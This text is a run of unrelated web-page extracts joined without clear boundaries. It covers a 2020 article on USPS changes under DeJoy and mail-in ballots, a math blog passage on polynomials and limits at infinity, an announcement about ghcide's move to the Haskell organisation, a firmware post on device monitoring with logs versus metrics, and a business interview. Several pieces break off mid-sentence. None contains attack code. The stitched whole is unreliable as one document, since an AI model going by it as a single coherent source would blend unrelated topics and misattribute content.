<li><strong>Removal of public mailboxes: </strong>Mailbox removals are also fairly normal for the postal service, given the declining trends in mail volume. <a href="https://thehill.com/homenews/administration/512538-postal-service-defends-removing-mailboxes-after-stack-of-discards" rel="noopener" target="_blank"><span>Viral images</span></a> of box removals, both legitimate and years-old, stoked concerns that such changes would negatively impact the forthcoming election. DeJoy <a href="https://slate.com/business/2020/08/usps-mail-slowdown-dejoy-trump-election.html" rel="noopener" target="_blank"><span>testified that</span></a> about 700 boxes have been removed under his tenure and that 35,000 have been removed in the last decade (roughly 3,500 a year).</li>
<li><strong>Mail truck changes: </strong>Part of DeJoy’s changes have been to enforce <a href="https://www.forbes.com/sites/alisondurkee/2020/08/24/postmaster-general-louis-dejoy-usps-board-chairman-robert-duncan-testify-house-oversight-hearing-postal-service/#570a9f6f6d5a'" rel="noopener" target="_blank"><span>strict departure times</span></a> for the larger mail carrier trucks that traverse the nation. The effort, meant to keep the agency moving on schedule, has led to perverse outcomes such as these trucks traveling <a href="https://www.newschannel5.com/news/newschannel-5-investigates/postal-trucks-sometimes-travel-across-country-with-no-mail-after-usps-cuts" rel="noopener" target="_blank"><span>completely empty</span></a>.</li>
</ul>
<div><p>These changes have been decried publicly by Democrats (including <a href="https://www.npr.org/2020/08/13/902109991/trump-admits-to-opposing-funding-for-postal-service-to-block-more-voting-by-mail" rel="noopener" target="_blank"><span>Joe Biden</span></a>), civil society organizations, and <a href="https://theintercept.com/2020/07/29/usps-postal-service-privatization/" rel="noopener" target="_blank"><span>USPS employees</span></a>. At least <a href="https://www.forbes.com/sites/alisondurkee/2020/08/25/more-than-20-states-attorneys-general-suing-postal-service-usps-changes-despite-dejoy-reversal/#56a2d0d04533" rel="noopener" target="_blank"><span>20 states</span></a> have sued DeJoy over the changes. And malicious or not, the changes have pretty clearly led to a widespread impacts on the USPS’s ability to deliver mail in a timely manner — all at a time when Americans are relying on it in several ways.</p></div>
<h3><strong>Will DeJoy’s Changes Influence the Election?</strong></h3>
<p>Through two testimonies, DeJoy was adamant that <a href="https://abcnews.go.com/Business/postal-service-flashpoint-ahead-2020-election/story?id=72420566" rel="noopener" target="_blank"><span>no further changes</span></a> would be made prior to the elections and insisted that the USPS is <a href="https://www.vox.com/2020/8/22/21396968/uses-postal-service-democrats-special-session-dejoy-trump-25-billion-election-voting" rel="noopener" target="_blank"><span>highly confident</span></a> in delivering mail-in ballots on time. Many are quick to point out that the anticipated surge in ballot-related mail is really just a <a href="https://reason.com/2020/08/21/post-office-expects-9-billion-loss-this-year-but-will-prioritize-mail-in-ballots-before-election-day/" rel="noopener" target="_blank"><span>drop in the bucket</span></a> in the grand scheme of the <a href="https://www.washingtonexaminer.com/opinion/columnists/a-reality-based-look-at-trump-and-the-post-office" rel="noopener" target="_blank"><span>471 million pieces</span></a> of mail the USPS deals with daily. Additionally, USPS workers assign <a href="https://www.vox.com/recode/2020/8/7/21358946/postal-service-mail-delays-election-trump-mail-in-ballots" rel="noopener" target="_blank"><span>utmost priority to ballot-related mail</span></a>, and DeJoy has indicated that they will even <a href="https://www.foxnews.com/politics/house-republicans-deny-usps-delays-despite-evidence-of-service-failures" rel="noopener" target="_blank"><span>give ballots priority</span></a> over first-class mail if needed.&nbsp;</p>
<p>“We will deploy processes and procedures that advances any election mail, in some cases ahead of first class mail.” - <a href="https://www.foxnews.com/politics/house-republicans-deny-usps-delays-despite-evidence-of-service-failures" rel="noopener" target="_blank"><span>Postmaster DeJoy</span></a></p>
<div><p>A series of letters sent out by the USPS to <a href="https://slate.com/business/2020/08/usps-mail-slowdown-dejoy-trump-election.html" rel="noopener" target="_blank"><span>46 states</span></a> prior to the election warned of the danger of ballots not being delivered on time, creating further concern for election watchers. However, the letters appear to be more of a matter of routine, impressing the importance of having voting deadlines that provide the USPS plenty of time to do their job, given past examples of sudden gluts of ballot related mail. These concerns don’t appear to be driven by DeJoy’s changes.</p></div>
<p><span><img src="https://lh6.googleusercontent.com/T_f9bCh1Zar2xUOsrrzOIgmwCMXD3B6gCv164mzuqlRX0UqFBTmzTf9ZFrstQXqO02MoQZ-GNbVTvqPgZHFpGcZAIFAmNgXPlr3OtQ5dAjxg7V4hd2zEgBkbxsTyWdVLoyBL8PzI" width="343" height="343"></span></p>
<p><br>But these formal assurances will do little to settle the nerves of those concerned with the upcoming election. In the context of the doubt President Trump has cast on mail-in ballots and the heated nature of the election, there is little room for error. Were ballots not to arrive on time, it could have outsized impacts in battleground states and cast doubt on close results. And <a href="https://www.salon.com/2020/08/21/leaked-email-us-postal-service-instructs-workers-not-to-reconnect-sorting-machines/" rel="noopener" target="_blank"><span>reports from …</span></a></p></span></p></div></div></div></div></div></div></div></div></div></div></div>

The names? <strong>Polynomial</strong> and <a href="https://mathvault.ca/math-glossary/#infinite"><strong>infinity</strong></a>! While the former&nbsp;might have sounded a bit like the name of a <em>snake</em>, polynomials is a <em>one-of-its-kind</em> mathematical entity whose perfection defies our mathematical imagination.</p><p>For one, polynomials are well-known for being&nbsp;<em>infinitely smooth</em> and <em>never-ending</em>, while at the same time, they could be a <em>line</em>, a <em>parabola</em>, or any&nbsp;kind of weird, <strong>infinitely-malleable curve</strong>&nbsp;ready to&nbsp;assume&nbsp;any shape drawn without <em>lifting</em> the pencil (kind of). Heck, polynomials are a&nbsp;favorite object of <em>platonic desire</em> among math enthusiasts. Talk about the <em>interaction</em> between polynomial and infinity!</p><p>So with all that goodness, it makes sense for us to inquire a bit as to why despite of having similar forms, the behaviors of polynomials at the infinities differ, leading to some seemingly unrelated insights about their <strong>properties</strong> in general.</p><p>All right. Enough said. Time to buckle the seat belt, and let the theoretical musing begins! <span id="more-7079"></span></p><h2 id="poly"><span id="Polynomials_%E2%80%94_A_Review"></span><a href="#toc">Polynomials — A Review</a><span></span></h2><p>A <em>non-zero</em>,&nbsp;real-valued function of the form $\displaystyle&nbsp;cx^n$ — where $c \in \mathbb{R} \setminus \{ 0 \}$ and $n \in \mathbb{N}$ — forms the building blocks of polynomials. For that reason, they are usually called the (non-zero)<strong> monomials</strong>, with&nbsp;the number $n$ being the <strong>degree</strong> of the monomial in question. For example, the <em>constant function</em> $\frac{\pi}{4}$ represents a monomial with degree $0$, whereas the function $ex^{666}$ would be a monomial with degree $666$ (!).</p><p>(for the record, the <em>zero function</em> also falls into the category of monomials, except that its degree is usually left <em>undefined</em>, for the obvious reason that it can be expressed <em>numerous</em> forms).</p><p>Once there, we can define a <strong>non-zero polynomial</strong> as a function of the form:</p><p>\begin{align*} f_1(x)+ \dots + f_m(x) \end{align*}</p><p>where $m \in \mathbb{N_+}$ (i.e., a <em>positive</em> integer) and each $f_i(x)$ is&nbsp;a&nbsp;<em>non-zero</em> monomial.</p><p>In which&nbsp;case, we define the <strong>degree</strong> of a <em>non-zero</em> polynomial as the <em>maximal</em> degree of its monomials (always well-defined, since there’s only a <em>finite</em> number of&nbsp;monomials). For example, the constant function $\frac{\ln 2 + 3}{2e}$ represents&nbsp;a polynomial of degree $0$, and&nbsp;the function $3 + 2x^3 + x + x^2$ a polynomial of degree $3$.</p><p>(as with before, the <em>zero function</em>&nbsp;still falls into the category of polynomials, with the caveat that its degree is usually left undefined — due to the ambiguity of its leading term)</p><p>For the sake of <em>simplicity</em> and <em>consistency</em> though, we usually prefer to write a <em>non-zero</em> polynomial by gathering up the <em>like terms</em>, and rearranging the resulting terms so that the monomials are presented in increasing/decreasing order based on&nbsp;their degrees. Once that’s done, we refer to the monomial of the highest degree as the <strong>leading term</strong> of the polynomial, and its coefficient the <strong>leading coefficient</strong> of the polynomial.</p><p>For example, instead of writing $10x^3+2x^2+ 5x+ 6x^2 + 5 + 2 x^3$ as our polynomial, we prefer to regroup the like terms and rewrite it as $12x^3 + 8x^2 + 5x + 5$, from which it can be seen&nbsp;that we have a polynomial of <em>degree</em> $3$ (i.e., a <strong>cubic polynomial</strong>) — with $12$ as&nbsp;the <em>leading coefficient</em>.</p><p>In general, a <em>non-zero</em> polynomial can have <em>any</em> non-zero number as leading coefficient. However, in the special case where the leading coefficient is $1$, it is as if it it&nbsp;kind of disappears out of sight.&nbsp;In which case, we refer to the said polynomial as a <strong>monic polynomial</strong>.</p><p>In addition, since&nbsp;every <em>non-zero</em> polynomial can be re-expressed in terms of<em>&nbsp;monic polynomial</em>&nbsp;by <em>factoring out</em> the leading coefficient,&nbsp;it sometimes makes sense to&nbsp;analyze the properties of a non-zero polynomial by looking instead at the properties&nbsp;of its <em>underlying&nbsp;monic polynomial</em>.</p><p>Alternatively, we can also define a polynomial <em>recursively</em>&nbsp;as follows:</p><div><p>Definition 1 — Recursive Definition of Polynomial</p><div><p><em>A&nbsp;real-valued</em> function $p(x)$ is a <strong>polynomial</strong> if and only if it satisfies one of the two following options — through a <em>finite</em> number of iterations:</p><ol><li>$p(x)=c$ for some $c \in \mathbb{R}$ (i.e., a <em>constant function</em>).</li><li>$p(x) = x q(x) + c$, where $q(x)$ is a <em>polynomial</em> and $c \in \mathbb{R}$.</li></ol></div></div><p>For example, $x^2 + 2x + 1$ is a polynomial by the standard of this&nbsp;<em>recursive definition</em>, since $x^2+2x+1 = x ( x+2) + 1$, where $x+2$ is very well a polynomial (why?) and $1$ very well a constant. In general, the recursive definition of polynomial suggests a way of <em>reducing</em> a polynomial of degree $n+1$ to that of degree $n$ — an handy insight when it comes to proving facts about <em>non-zero</em> polynomials using the so-called&nbsp;<strong>mathematical induction</strong> on the <em>degree</em> of polynomials.</p><h2 id="inflim"><span id="A_Venture_Into_the_Infinite_Limits"></span><a href="#toc">A Venture Into the&nbsp;Infinite Limits</a><span></span></h2><p>When tackling the behavior of a function at the infinities, it makes sense that we equip ourselves with some <strong>limit laws</strong>&nbsp;on how <em>infinity-converging</em> and <em>constant-converging</em> functions&nbsp;interact with each other. To that end, we present the following&nbsp;<em>6</em> sets of&nbsp;limit laws for your pleasure. 🙂</p><h3 id="constantfunction"><span id="Interactions_Between_InfinityConverging_and_Constant_Functions"></span><a href="#toc">Interactions Between Infinity-Converging and Constant Functions</a><span></span></h3><p>To start off, let’s imagine that we have a function $f(x)$ and a constant function $c$, where $f \to \infty$ as $x \to \infty$. The question is, what does the function $f(x) + c$ tends to — if any&nbsp;— as $x \to \infty$?</p><p>Here, it shouldn’t be a surprise that $f(x)+c$ converges to $\infty$ as well. To see why, we first note that since $f \to \infty$ as $x \to \infty$, the <strong>definition of limit</strong> implies that:</p><blockquote><p>Given <em>any</em>&nbsp;number — however <em>large</em> — there’ll always be <em>some</em>&nbsp;<strong>neighborhood</strong> $N$ of the form $(\bigcirc, \infty)$, such that every member&nbsp;in $f(N)$ <em>exceeds</em> this number.</p></blockquote><p>This means that&nbsp;given <em>any</em>&nbsp;number $r$, it would then be&nbsp;possible to find one such&nbsp;<em>neighborhood</em> $N$ such that $f(x) &gt; r – c$ for all $x \in N$. In which case, we would have that:</p><p>\begin{align*} f(x) + c &gt; &nbsp;r \qquad (\forall x \in N) \end{align*}</p><p>thereby&nbsp;showing that the function $f(x) + c$ increases&nbsp;<em>beyond bound</em>&nbsp;as $x \to \infty$ — regardless of the value of&nbsp;$c$.</p><p>Naturally, this leads to the following question: what if $f$ actually converges to $-\infty$ instead as&nbsp;$x \to \infty$? Well, referring to the <em>definition of limit</em> again,&nbsp;we have that:</p><blockquote><p>Given <em>any</em>&nbsp;number — however <em>negative</em>&nbsp;— there’ll always be <em>some</em>&nbsp;<strong>neighborhood</strong> $N$ of the form $(\bigcirc, \infty)$, such that every member&nbsp;in $f(N)$ <em>precedes</em>&nbsp;this number.</p></blockquote><p>This means that&nbsp;given <em>any</em>&nbsp;number $r$, it would then be&nbsp;possible to find one such&nbsp;<em>neighborhood</em> $N$ such that $f(x) &lt; r – c$ for all $x \in N$. In which case, we would have that:</p><p>\begin{align*} f(x) + c &lt; r \qquad (\forall x \in N) \end{align*}</p><p>hence&nbsp;showing that the function $f(x) + c$ decreases&nbsp;<em>beyond bound</em>&nbsp;$x \to \infty$, and this again regardless of the <em>sign</em> and <em>size</em> of&nbsp;$c$. Putting everything together, we obtain&nbsp;our <em>first</em> set of limit laws concerning <strong>constant functions</strong>:</p><div><p>Proposition 1 — Limit Laws Concerning Constant Functions (Sum)</p><p>Given a <em>real-valued</em> function $f(x)$ and a constant function $c$, if as $x \to \Box$ (where $\Box$ could be a number, $+\infty$ or $-\infty$), $f(x)$ converges to one of the infinities, then the function&nbsp;$f(x)+c$ converges to the <em>same</em> infinity $f(x)$ converges to — as $x \to \Box$.</p></div><p>Now, what about the cases where a function is <em>multiplied</em> by a constant, as in the case of $c f(x)$ where $c&gt;0$? Well, as logic would have dictated, the <strong>convergence behavior</strong> of $c f(x)$ should&nbsp;depend on what $f(x)$ converges to in the first place.</p><p>For example, if we know in advance that $f(x)$ converges to $\infty$ as $x \to \infty$, then the definition of limit would imply that given <em>any</em> number $r$ — no matter how&nbsp;<em>positive</em>&nbsp;— we can always&nbsp;find a neighborhood $N$ of the form $(\bigcirc,\infty)$ such that:</p><p>\begin{align*} f(x) &amp; &gt; \frac{r}{c} \qquad (\forall x \in N) \end{align*}</p><p>That is,</p><p>\begin{align*} cf(x) &amp; &gt; r &nbsp;\qquad (\forall x \in N) \end{align*}</p><p>showing that the function $cf(x)$ increases <em>without bound</em> as $x \to \infty$.</p><p>On the other hand, if $f(x) \to -\infty$ instead as $x \to \infty$ (remember that $c&gt;0$), then we can similarly infer that given <em>any</em> number $r$ — however&nbsp;<em>negative</em> — it is always possible to find a neighborhood $N$ of the form $(\bigcirc,\infty)$ such that:</p><p>\begin{align*} f(x) &amp; &lt; \frac{r}{c} \qquad (\forall x \in N) \end{align*}</p><p>That is,</p><p>\begin{align*} cf(x) &amp; &lt; r &nbsp;\qquad (\forall x \in N) \end{align*}</p><p>showing that the function $cf(x)$ decreases&nbsp;<em>without bound</em> as $x \to \infty$.</p><p>Now, this still leaves us with the scenario&nbsp;where $c$ is <em>negative</em>. In which case, using very similar&nbsp;arguments, it can still&nbsp;be shown that as $x \to \infty$:</p><ol><li>$f(x) \to +\infty$ implies that $cf(x) \to -\infty$.</li><li>$f(x) \to -\infty$ implies that $cf(x) \to +\infty$.</li></ol><p>So that if we combine these insights together, we get our <em>second</em> set of limit laws concerning <strong>constant functions</strong>:</p><div><p>Proposition 2 — Limit Laws Concerning Constant Functions (Product)</p><div><p>Given a <em>real-valued</em> function $f(x)$ and a constant function $c$, if as $x \to \Box$ (where $\Box$ could be a number, $+\infty$ or $-\infty$), $f(x)$ converges to one of the infinities, then the following cases apply as $x \to \Box$:</p><ol><li>If $c&gt;0$, then $c f(x)$ converges to the <em>same</em> infinity $f(x)$ converges to.</li><li>If $c&lt;0$, then $c f(x)$ converges to the <em>opposite</em>&nbsp;infinity $f(x)$ converges to.</li></ol></div></div><p>Interestingly, the above&nbsp;limit laws applies <em>irrespective of the size of $c$</em>. For example, $c$ could be $0.00001$ and $f(x)$ could converge to $+\infty$, and $cf(x)$ would have converged to $+\infty$ regardless. Likewise, $c$ could be $\frac{1}{e}$ and $f(x)$ could converge to $-\infty$, and $cf(x)$ would have converged to $-\infty$ regardless.</p><h3 id="infpluscon"><span id="Infinity_+_Constant"></span><a href="#toc">Infinity + Constant</a><span></span></h3><p>Moving from the constant functions into the general realm,&nbsp;let’s assume that we’re given two functions $f(x)$ and $g(x)$, such that as $x \to \infty$, $f$ converges to one of the infinities and $g$ converges to some real number $G$. The question is, what can we extrapolate about the <strong>convergence behavior</strong> of $f+g$ — if any?</p><p>Here, to figure this&nbsp;out, we begin by noticing that since $g$ converges to an <em>actual</em> number $G$, by …</p></section></div></div></div></div></div>

<p>We started building ghcide over 2 years ago as part of our efforts at Digital Asset to provide a great IDE experience to all <a href="https://daml.com/" target="_blank" rel="noreferrer noopener">DAML</a> users. As a lot of people in the Haskell community know, the DAML compiler is based on a modified version of GHC, so naturally the people working on it were Haskell programmers. As ghcide got better and better, and we got to experience it whenever we were working on DAML codebases, we started missing the same features from our Haskell development. Over time, we started abstracting over DAML-specifics and eventually managed to get it working on some hand-crafted Haskell projects, but couldn’t integrate with Cabal, Stack or other build tools. Around that time, we also open sourced the whole <a href="https://github.com/digital-asset/daml" target="_blank" rel="noreferrer noopener">DAML codebase</a> which included ghcide – but we didn’t announce ghcide anywhere. Luckily, at this time Matthew Pickering released <a href="https://github.com/mpickering/hie-bios" target="_blank" rel="noreferrer noopener">hie-bios</a> which made it trivial to integrate ghcide with all of the various build tools in the Haskell system while still using the same codebase as the basis for the DAML IDE.</p>



<p>External interest in ghcide was very limited until Neil gave a <a href="https://www.youtube.com/watch?v=cijsaeWNf2E&amp;list=PLxxF72uPfQVRdAsvj7THoys-nVj-oc4Ss" target="_blank" rel="noreferrer noopener">keynote at MuniHac 2019</a>. </p>

</div></figure>



<p>Interest and external contributions skyrocketed over a few days and we split ghcide into a separate repository to make it easier for contributors and users that no longer had to deal with the DAML monorepo. Since then, there have been a huge number of contributions to ghcide that not only benefited Haskell users, but also DAML users. It is impossible to name all the amazing features that have been contributed to ghcide, but some of our favourites include:</p>



<ul><li>Support for code completions</li><li>Many significant performance improvements</li><li>Multi-component support</li><li>A wide variety of code actions</li></ul>



<p>In January 2020, a lot of ghcide contributors and contributors from <a href="https://github.com/haskell/haskell-ide-engine/" target="_blank" rel="noreferrer noopener">haskell-ide-engine</a> got together and agreed to unify their efforts as part of <a href="https://github.com/haskell/haskell-language-server" target="_blank" rel="noreferrer noopener">haskell-language-server</a> – which builds on top of ghcide while carrying over all the features and plugins that came from haskell-ide-engine. Half a year later, it’s not a stretch to say that this endeavour has been an enormous success and enthusiastic statements from users can attest to this. Finally, most efforts on Haskell tooling are focused on a single approach and everyone can benefit from improvements.</p>



<p>As the importance of ghcide to Haskell tooling has grown, keeping such an important repository in the Digital Asset organisation with only Digital Asset employees as maintainers has started to hold back the flood of contributions. Therefore, in consultation with many of the contributors, Digital Asset has made the decision to turn ghcide into a proper community project under the <a href="https://github.com/haskell" target="_blank" rel="noreferrer noopener">haskell</a> github organization. In making this transition, ghcide gains a much wider team of maintainers, sourced from the current active ghcide contributors. The DAML IDE will switch to an open source fork of ghcide and cherry-pick changes from upstream as needed and we will continue to upstream bugfixes and improvements into ghcide.</p>



<p>We are very excited to see in which directions ghcide will grow in the future. Thanks to all ghcide contributors and in particular to Pepe Iborra, Matthew Pickering, Alan Zimmermann, wz1000, Luke Lau, Alejandro Serrano, fendor and Jacek Generowicz. We’ve enjoyed being part of the Haskell IDE tooling community, and look forward to working with both current and new contributors in the future.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

        <p>Releasing a connected device in today’s world without some form of monitoring in
place is a recipe for trouble. How would you know how often or if devices are
experiencing faults or crashing? How can the release lead be confident that no
connectivity, performance, or battery-life regressions have occurred between the
past and current firmware update?</p>

<p><strong>The answer is that you need device monitoring in place long before ever
shipping a firmware update to devices in the field.</strong></p>

<p>There have been several occasions in the past where I’ve introduced several
performance and battery-life regressions that were never caught in internal beta
testing of 50 devices. They were always subtle changes, such as an
“optimization” that ended up causing high file system churn (which reduced
battery life), or issues that crop up when connected over certain transports or
to different mobile phone models. These bugs were caught in one of two ways:
either a customer angry enough would submit a bug report, or we’d catch the
regression on our internal dashboards which were powered by our suite of SQL
queries that would run periodically.</p>

<!-- excerpt start -->

<p>In this post, we lay the foundation for how an organization should instrument
their embedded firmware to measure performance, stability, and the overall
“health” of each device and an entire fleet of devices. We also compare and
contrast the various approaches projects generally take to surface these metrics
and I’ll discuss why I believe heartbeat metrics are the best method for driving
product decisions.</p>

<!-- excerpt end -->

<blockquote>
  <p>This post is guaranteed to be the tip of the iceberg in a series of posts
about how to do device monitoring <em>properly</em> at scale. With this in mind, this
post will be slightly more high-level than a typical “Interrupt” post.</p>

<h2 id="fleet-monitoring-overview">Fleet Monitoring Overview</h2>

<p>Device and software monitoring is not a new concept. There have been many new
ambitious projects to solve the problem from a couple of devices to monitoring
millions of servers or containers.</p>

<p>I’d like to talk about a few different variations of monitoring and how they
relate to us in the world of embedded systems.</p>

<h3 id="application-performance-monitoring-apm">Application Performance Monitoring (APM)</h3>

<p>Application performance monitoring services collect and aggregate different
metrics on computer systems and software, and they alert customers when these
numbers either increase or decrease in abnormal ways. Common metrics that are
collected by APM’s are:</p>

<ul>
  <li>CPU, RAM, and hard drive usage</li>
  <li>Response times and values</li>
  <li>Request rates and failures</li>
</ul>

<p>They work by installing hooks in various places in the code. Common examples are
the pre/post request handlers for a web application and the pre/post handlers
for a database transaction. By hooking into both sides of common operations,
they can take a snapshot of the system before and after, and compare memory
usage and time deltas.</p>

<p>When an APM is hooked up to every instance of an application, it can paint a
detailed picture of how an application, server, or fleet of either are
performing at any given time.</p>

<p>APM’s aren’t a new concept, as one of the largest ones, New Relic, was founded
in 2008 and is now a publicly-traded company.</p>

<p><strong>Software services:</strong> New Relic<sup id="fnref:new_relic"><a href="#fn:new_relic">1</a></sup>, Datadog<sup id="fnref:datadog"><a href="#fn:datadog">2</a></sup>,
ScoutAPM<sup id="fnref:scout_apm"><a href="#fn:scout_apm">3</a></sup><br> <strong>Open Source Libraries</strong>: StatsD<sup id="fnref:statsd"><a href="#fn:statsd">4</a></sup>,
CollectD<sup id="fnref:collectd"><a href="#fn:collectd">5</a></sup>, Prometheus<sup id="fnref:prometheus"><a href="#fn:prometheus">6</a></sup></p>

<h3 id="tracing-and-logging">Tracing and Logging</h3>

<p>I’ve grouped these into a single group because they accomplish the same goal.</p>

<p>Traces and logs give you an in-depth timeline view of what happened on a single
device and allow you to zero-in on issues as long as you know what you are
looking for. They work by having the developer install logs or trace events
during the coding phase or automatically by installing hooks in the context
switch handler and various system API calls.</p>

<p>Traces and logs, just like an APM, can tell you where most of the time is spent
in an application or system, but there are drawbacks.</p>

<p>The amount of data collected by tracing and logging tools is immense, and most
of the data doesn’t get used or processed. In their raw form, they are not
easily aggregated or actionable.</p>

<p>I view tracing and logging as a silo of (valuable) data that is only queried
when developers <strong>know</strong> there is an issue with a specific device.</p>

<p><strong>Software services:</strong> New Relic<sup id="fnref:new_relic:1"><a href="#fn:new_relic">1</a></sup>, Datadog<sup id="fnref:datadog:1"><a href="#fn:datadog">2</a></sup><br> <strong>Firmware
services:</strong> Percepio<sup id="fnref:percepio"><a href="#fn:percepio">7</a></sup></p>

<h3 id="crash-reporting">Crash Reporting</h3>

<p>How nice would it be to have in-depth analysis and alerts for every unique
crash, fault, assert, and error log that devices in the field experience? That
is what these services provide.</p>

<p>When any of the listed error handlers are triggered, these libraries gather all
of the relevant data, such as previous logs, backtraces of the currently running
threads, local variables, global variables, etc. and push all of this data to a
central server to be processed. These issues are then de-duplicated and
presented in a bug-tracker like fashion to the user.</p>

<p>These systems usually require an SDK to be shipped with the application. These
services must build and support an SDK that is written in the same language and
for the same framework as the application they monitor.</p>

<p>For firmware, they would likely install hooks into the
<a href="https://interrupt.memfault.com/blog/asserts-in-embedded-systems">assert</a>,
<a href="https://interrupt.memfault.com/blog/cortex-m-fault-debug">fault</a>, and
<a href="https://interrupt.memfault.com/blog/firmware-logs-stack-trace">logging</a> handlers.</p>

<p>The beautiful thing about crash reporting tools is they are relatively easy to
integrate because the entry-points they hook into are standardized by the
language and frameworks. They also surface hard to reproduce or never before
seen issues easily and provide a wealth of data to fix the problem quickly.</p>

<h3 id="instantaneous-state-monitoring">Instantaneous State Monitoring</h3>

<p>This is the category that most of today’s “IoT monitoring solutions” fall into.
They assume a near-constant connection to the Internet and hold the state of
every device in the service.</p>

<p>Devices can either push this information whenever states change, at regular
intervals, or the remote server can pull data as well.</p>

<p>These systems ingest many of the system vitals that developers and managers want
to know, like heap usage, current battery life, or whether certain peripherals
are on or off. These values can be queried across the entire fleet or a subset
of devices, but trends or custom queries are more difficult.</p>

<p>For instance, attempting to query for the amount of time the Bluetooth radio is
on per day is nearly impossible, unless the infrastructure is <strong>100% certain</strong>
that it received every state change event from the device.</p>

<p>The statistic of time-active is a critical measurement for embedded devices, and
is one of the best predictors of battery-life drain and performance.</p>

<h3 id="what-about-embedded-systems">What About Embedded Systems?</h3>

<p>Most of the above services or strategies listed above do not apply to
constrained embedded systems. Save for Memfault and Percepio, most of the
solutions would require orders of magnitude more memory, CPU, power, and
Internet bandwidth.</p>

<p>There is hope though. We will explore how we can manage to get the most
important and actionable metrics out of embedded systems and gain an
understanding of how devices are performing in the field.</p>

<h2 id="logging-vs-metrics">Logging vs Metrics</h2>

<p>I want to quickly cover the difference and use-cases for two common forms of
data collected from systems: logs and metrics.</p>

<h3 id="logs">Logs</h3>

<p>Logs are immutable events that happened over time to a single device. They are
instrumental in debugging as they help a developer determine what happened
before and after issues occur.</p>

<p>Logs are usually forwarded from individual devices to a centralized datastore
such as S3, or to a log aggregator, such as Elastisearch, to be further
transformed and processed. Unfortunately, more often than not, the logs are
ingested and forgotten about.</p>

<p>A developer might dig up a particular device’s log files in response to a
customer support request, but that requires a <code>pull-logs-from-s3.py</code> script and
a decent amount of time to determine where the device behaved unexpectedly.</p>

<h3 id="metrics">Metrics</h3>

<p>Metrics are a set of numbers that give information about a particular process or
activity. They are measured over intervals of time and are usually just numbers.
This means that they are pre-processed and more compact than logs, which means
that you can store and query many more of them at once.</p>

<p>Metrics themselves don’t help developers debug individual instances of issues or
bugs, but they help organizations <strong>detect</strong> issues by measuring the data points
that matter most. For many hardware makers, these metrics might be:</p>

<ul>
  <li>Crash-free hours</li>
  <li>Average battery life</li>
  <li>Wi-Fi/BLE connected time per hour</li>
</ul>

<h3 id="transforming-logs-into-metrics">Transforming Logs into Metrics</h3>

<p>Logs can be transformed, processed, and aggregated into metrics, but this
usually involves massive and complex data pipelines.</p>

<p>After working as a firmware engineer at a few hardware companies in the past, I
can tell you that I was out of my depth trying to parse logs at scale, and I was
rarely getting the help I needed from the web and infrastructure teams because
they had their own roadmaps to complete.</p>

<p>The other problem with logs is that they generally log state transitions and
force the developer or log aggregator to measure the time between these state
transitions. Let’s try to calculate one of the important device metrics above,
Wi-Fi connected time per hour.</p>

<div><div><pre><code>[E][11:30:00] Wi-Fi connected
[W][11:45:00] Wi-Fi disconnected, reason: -2
[I][12:30:00] Wi-Fi connected
</code></pre></div></div>

<p>This calculation is relatively easy assuming we can process logs linearly. We
see at 11:30 the device was connected to Wi-Fi, then disconnected at 11:45, so
the time connected this hour was 15 minutes.</p>

<p>Let’s present a problem that happens all the time with embedded systems.</p>

<div><div><pre><code>[E][11:30:00] Wi-Fi connected

# Wi-Fi disconnect event lost by device or in transport

[I][12:30:00] Wi-Fi connected
</code></pre></div></div>

<p>Oh no! A dropped log message.</p>

<p>Can we compute accurately how long the device was connected to Wi-Fi given the
information above? <strong>No we can’t</strong>. We’d probably throw away this event during
processing or accidentally include it and say Wi-Fi was connected for the entire
hour.</p>

<p>We can do …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>Running a profitable agency is hard.</p><p>Using said profits to reinvest into real estate, stocks and tech startups is much harder. Jay Vasantharajah did exactly that. He is a very inspiring entrepreneur who has built an award-winning PPC agency and 7-figure eCommerce business. Something tells me this empire is just starting. I was curious to learn about his story and hear about what built his discipline to focus on cashflow and create an impressive investment portfolio.</p><p>‍</p><p><strong>How did you get started in digital marketing?</strong></p><p>I started building websites for fun, and eventually convinced a small local accountant that I could build him a website. I think I made $500 for it, and quickly realized that I really enjoyed building websites. I went on to build&nbsp; websites for all the student councils in my university.</p><p>I then started learning PPC and SEO to help my dad drive business for his airport limo business. By the time I graduated university (I studied finance and accounting btw) I had a pretty good handle of digital marketing and web development.</p><p>‍</p><p><strong>What is the origin story behind your agency, ClientFlo?</strong></p><p>I spotted the opportunity when I came across a large communication company selling a packaged PPC service to SMBs across Canada. The PPC packages being offered were terrible; they&nbsp; consisted of cookie cutter landing pages and copy/pasted campaign setups, and the results were terrible.</p><p>Yet this company was selling these PPC packages like hot cakes. I would spend hours reading and analyzing the negative consumer reviews. The demand for these services was there, and I knew based on my knowledge I could do better. And that’s when I decided to start ClientFlo out of my condo. I had no clients or connections, but the confidence that I could offer SMB’s better services.&nbsp;</p><p>I incorporated ClientFlo on a Friday, starting cold calling the following Monday and closed my first client within a week. That instantly gave me the confidence to keep going, close more clients and to grow my company. I would spend all day cold-calling potential clients, stay up all night managing the campaigns. Once ClientFlo had around 10 clients, I knew it was time to get help and a start to build a team.</p><p>As ClientFlo continued to grow, we moved to our first office.</p><figure id="w-node-679817d579f7-8b48bcde"><p><img src="https://uploads-ssl.webflow.com/5ac26aa260db49e86f48bcdc/5f4ea500bc40bb28d71956d6_n4pj6bovIRI1ZU927m4iAqUKwOKelJ8HXRsUwG8iCIH4BzPYSoesJEqQTCL-cTFGd7A8Y9iHwnoAp9d3e2NpADmTuMVvcHv40o6sS8MHylx-fdS0ZH0urbWFkxevwhVfeJMxUDbW.jpeg" alt=""></p></figure><p>‍</p><p><strong>At the peak of the agency, what was the annual revenue and how many employees?</strong></p><p>Low seven-figures per year with about 5 full-time employees (including myself) and a couple contractors.</p><p>‍</p><p><strong>How did you get initial sales for the agency?</strong></p><p>Straight <a href="https://jayvas.com/cold-calling-isnt-dead-and-why-all-entrepreneurs-should-learn-it/">cold-calling clients</a>. It was a grind, but ended up being very effective. I highly recommend all entrepreneurs to try cold-calling as early in their career as possible. It’s the “school of hard knocks” way to learn how to sell. And as any successful entrepreneur would tell you, the selling never stops - so get great at it!</p><p>‍</p><p><strong>Describe the process of being a general investor from an agency operator?</strong></p><p>Investing, for me, started way before my agency, ClientFlo. The cash-flow from my agency accelerated the growth of my investments portfolio.</p><p>I started my investing career <a href="https://jayvas.com/charlie-munger-is-right-haul-ass-for-your-first-100k/">buying a cash-flowing real estate property</a>, which made it easier for me to quit my job and start ClientFlo. I continued to 